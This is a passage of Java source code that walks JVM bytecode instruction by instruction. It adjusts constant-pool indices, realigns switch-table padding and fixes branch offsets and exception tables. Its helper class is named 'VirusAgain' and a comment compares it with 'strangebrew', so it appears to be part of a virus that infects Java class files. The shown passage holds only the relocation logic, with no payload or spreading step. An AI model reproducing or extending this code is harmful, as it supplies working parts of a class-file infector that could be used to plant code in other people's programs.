				case 0xa0:
				case 0x99:
				case 0x9c:
				case 0x9d:
				case 0x9e:
				case 0x9b:
				case 0x9a:
				case 0xc7:
				case 0xc6:
				case 0xa8:
				case 0x11:
				case 0x84:
					beenParsed = true;
					out.write(bytes, index, 2);
					index += 2;
					break;
				/*
				 * 2: index1, index2
				 */
				case 0xb4:
				case 0xb2:
					/*out.write(bytes, index, 2);
					index += 2;
					break;*/
					/*
					 * 2: indexbyte1, indexbyte2
					 */
				case 0xbd:
				case 0xc0:
				case 0xc1:
				case 0xb7:
				case 0xb8:
				case 0xb6:
				case 0x13:
				case 0x14:
				case 0xbb:
				case 0xb5:
				case 0xb3:
					beenParsed = true;
					VirusAgain._____increase2Index(bytes, index, change_amount);
					out.write(bytes, index, 2);
					index += 2;
					break;
				}
			}
			if (beenParsed) {
				continue;
			}

			/*
			 * Parse 3/5 instruction.
			 */
			{
				if (opcode == 0xc4) {
					beenParsed = true;
					VirusAgain._____increase2Index(bytes, index, change_amount);

					if (bytes[index + 1] == 0x84) {
						//1 + 5 bytes
						out.write(bytes, index, 5);
						index += 5;
					}
					else {
						//1 + 3 bytes
						out.write(bytes, index, 3);
						index += 3;
					}
				}
			}
			if (beenParsed) {
				continue;
			}

			/*
			 * Parse four-byte instruction.
			 */
			{
				if (opcode == 0xc5) {
					beenParsed = true;
					//3: indexbyte1, indexbyte2, dimensions
					VirusAgain._____increase2Index(bytes, index, change_amount);
					out.write(bytes, index, 3);
					index += 3;
				}
			}
			if (beenParsed) {
				continue;
			}

			/*
			 * Parse special instruction.
			 */
			{
				/*
				 * lookupswitch
				 * 
				 * We choose to use start of the code for alignment rather than method_start as strangebrew seems to.
				 */
				if (opcode == 0xab) {
					beenParsed = true;

					{
						/*
						 * Get the amount of padding for out then output the padding.
						 */
						int padding_out = Util.align4bytes(out.getFilePointer(), code_start_fp);
						for (int i = 0; i < padding_out; ++i) {
							out.write(0);
						}
						/*
						 * Skip padding bytes in bytes[].
						 */
						int padding_index = Util.align4bytes(index, code_start_index);
						index += padding_index;
					}

					/*
					 * Write out the rest of the instruction.
					 */
					/*int defalt =*/_____bytes4(bytes, index);
					out.write(bytes, index, 4);
					index += 4;

					int npairs = _____bytes4(bytes, index);
					out.write(bytes, index, 4);
					index += 4;

					int match_offset_len = (4 + 4) * npairs;
					out.write(bytes, index, match_offset_len);
					index += match_offset_len;
				}
				/*
				 * tableswitch
				 * 
				 * We choose to use start of the code for alignment rather than method_start as strangebrew seems to.
				 */
				else if (opcode == 0xaa) {
					beenParsed = true;

					{
						/*
						 * Get the amount of padding for out then output the padding.
						 */
						int padding_out = Util.align4bytes(out.getFilePointer(), code_start_fp);
						for (int i = 0; i < padding_out; ++i) {
							out.write(0);
						}
						/*
						 * Skip padding bytes in bytes[].
						 */
						int padding_index = Util.align4bytes(index, code_start_index);
						index += padding_index;
					}
					/*
					 * Write out the rest of the instruction.
					 */
					/*int defalt =*/_____bytes4(bytes, index);
					out.write(bytes, index, 4);
					index += 4;

					final int low = _____bytes4(bytes, index);
					out.write(bytes, index, 4);
					index += 4;

					final int high = _____bytes4(bytes, index);
					out.write(bytes, index, 4);
					index += 4;

					//System.out.println("defalt = " + defalt + ", low = " + low + ", high = " + high);
					//System.out.println("low = " + low + ", high = " + high);

					for (int i = 0; i < (high - low + 1); ++i) {
						long key = out.getFilePointer() - 1;
						int val = _____bytes4(bytes, index);

						SimpleEntry<Long, Integer> entry = new SimpleEntry<Long, Integer>(key, val);
						instructions_with_4byte_offsets.add(entry);

						//Write out the offset
						out.write(bytes, index, 4);
						index += 4;
					}
				}
			}
			if (beenParsed) {
				continue;
			}

			/*
			 * Parse five-byte instruction.
			 */
			{
				switch (opcode) {
				case 0xab:
				case 0xaa:
				case 0xc8:
				case 0xc9:
					beenParsed = true;
					out.write(bytes, index, 4);
					index += 4;
					break;
				case 0xba:
				case 0xb9:
					beenParsed = true;
					VirusAgain._____increase2Index(bytes, index, change_amount);
					out.write(bytes, index, 4);
					index += 4;
					break;
				}
			}
			if (beenParsed) {
				continue;
			}

			/*
			 * Parse single-byte instruction.
			 * NOTE: we can skip this because it does nothing.
			 * 		However, it does help us find unknown opcodes when they show up.
			 */
			{
				switch (opcode) {
				case 0x32:
				case 0x53:
				case 0x01:
				case 0x2a:
				case 0x2b:
				case 0x2c:
				case 0x2d:
				case 0xb0:
				case 0xbe:
				case 0x4b:
				case 0x4c:
				case 0x4d:
				case 0x4e:
				case 0xbf:
				case 0x33:
				case 0x54:
				case 0xca:
				case 0x34:
				case 0x55:
				case 0x90:
				case 0x8e:
				case 0x8f:
				case 0x63:
				case 0x31:
				case 0x52:
				case 0x98:
				case 0x97:
				case 0x0e:
				case 0x0f:
				case 0x6f:
				case 0x26:
				case 0x27:
				case 0x28:
				case 0x29:
				case 0x6b:
				case 0x77:
				case 0x73:
				case 0xaf:
				case 0x47:
				case 0x48:
				case 0x49:
				case 0x4a:
				case 0x67:
				case 0x59:
				case 0x5a:
				case 0x5b:
				case 0x5c:
				case 0x5d:
				case 0x5e:
				case 0x8d:
				case 0x8b:
				case 0x8c:
				case 0x62:
				case 0x30:
				case 0x51:
				case 0x96:
				case 0x95:
				case 0x0b:
				case 0x0c:
				case 0x0d:
				case 0x6e:
				case 0x22:
				case 0x23:
				case 0x24:
				case 0x25:
				case 0x6a:
				case 0x76:
				case 0x72:
				case 0xae:
				case 0x43:
				case 0x44:
				case 0x45:
				case 0x46:
				case 0x66:
				case 0x91:
				case 0x92:
				case 0x87:
				case 0x86:
				case 0x85:
				case 0x93:
				case 0x60:
				case 0x2e:
				case 0x7e:
				case 0x4f:
				case 0x02:
				case 0x03:
				case 0x04:
				case 0x05:
				case 0x06:
				case 0x07:
				case 0x08:
				case 0x6c:
				case 0x1a:
				case 0x1b:
				case 0x1c:
				case 0x1d:
				case 0xfe:
				case 0xff:
				case 0x68:
				case 0x74:
				case 0x80:
				case 0x70:
				case 0xac:
				case 0x78:
				case 0x7a:
				case 0x3b:
				case 0x3c:
				case 0x3d:
				case 0x3e:
				case 0x64:
				case 0x7c:
				case 0x82:
				case 0x8a:
				case 0x89:
				case 0x88:
				case 0x61:
				case 0x2f:
				case 0x7f:
				case 0x50:
				case 0x94:
				case 0x09:
				case 0x0a:
				case 0x6d:
				case 0x1e:
				case 0x1f:
				case 0x20:
				case 0x21:
				case 0x69:
				case 0x75:
				case 0x81:
				case 0x71:
				case 0xad:
				case 0x79:
				case 0x7b:
				case 0x3f:
				case 0x40:
				case 0x41:
				case 0x42:
				case 0x65:
				case 0x7d:
				case 0x83:
				case 0xc2:
				case 0xc3:
				case 0x00:
				case 0x57:
				case 0x58:
				case 0xb1:
				case 0x35:
				case 0x56:
				case 0x5f:
					beenParsed = true;
				default:
					if (beenParsed == false) {
						if (opcode < 0xcb || 0xfd < opcode) {
							break;
						}
						beenParsed = true;
					}
					break;
				}
			}
			if (beenParsed) {
				continue;
			}

			System.err.println("UNKNOWN OPCODE = " + opcode);
		}

		VirusAgain._____add2byteOffsets(out, ldc_fps, instructions_with_2byte_offsets);
		VirusAgain._____add4byteOffsets(out, ldc_fps, instructions_with_4byte_offsets);

		/*
		 * Update the exception table [which conveniently comes straight after the code].
		 */
		//fixExceptionTable(out, code_start_fp, out.getFilePointer(), ldc_fps);
		VirusAgain._____fixExceptionTable(bytes, code_start_fp, end_index, ldc_fps);

		if (index != end_index) {
			System.err.println("ERROR: index != end_index. This should never happen! index = " + index + ", end_index = " + end_index);
		}

		return (int) (out.getFilePointer() - code_start_fp);
	}
}
